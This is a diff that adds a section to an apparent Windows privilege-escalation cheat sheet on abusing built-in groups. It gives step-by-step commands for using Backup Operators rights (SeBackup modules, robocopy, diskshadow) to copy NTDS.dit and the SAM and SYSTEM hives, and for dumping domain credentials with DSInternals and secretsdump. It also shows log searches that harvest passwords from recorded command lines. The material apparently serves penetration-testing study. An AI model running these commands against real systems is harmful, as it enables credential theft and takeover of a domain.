@@ -174,3 +174,80 @@ c:\inetpub\wwwwroot\web.config
 %WINDIR%\system32\config\system.sav
 .kdbx
 ```
+
+## Windows Built-in Groups
+
+### Backup Operators
+
+- Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.
+
+```shell
+# PoC Script: https://github.com/giuliano108/SeBackupPrivilege
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+# Enable SeBackup Privilege if disabled
+Get-SeBackupPrivilege
+Set-SeBackupPrivilege
+
+# Create backup of file and read it
+Copy-FileSeBackupPrivilege <filepath> <backup  path>
+```
+- Copying `NTDS.dit`
+
+```shell
+# Backup NTDS.dit
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
+# Alternate:
+
+# Run diskshadow tool
+diskshadow.exe
+
+# Creating baackup of C drive
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+# Creating backup of NTDS.dit
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit <backup path>
+```
+
+- Extracting credentials from NTDS.dit file
+
+```shell
+# This privilege also allows us to backup SAM
+# and SYSTEM registry hives
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+
+# Extracting credentials from NTDS.dit
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=$DOMAIN,DC=local' -DBPath <.\ntds.dit path> -BootKey $key
+# From linux
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
+
+### Event Log Readers
+
+- Administrators or members of the Event Log Readers group have permission to access logs.
+
+```shell
+# Searching Security Logs Using wevtutil
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+wevtutil qe Security /rd:true /f:text /r:share01 /u:j$USER /p:$PASS | findstr "/user"
+
+# Searching Security Logs Using Get-WinEvent
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
+
+### DNS Admins
+coming soon
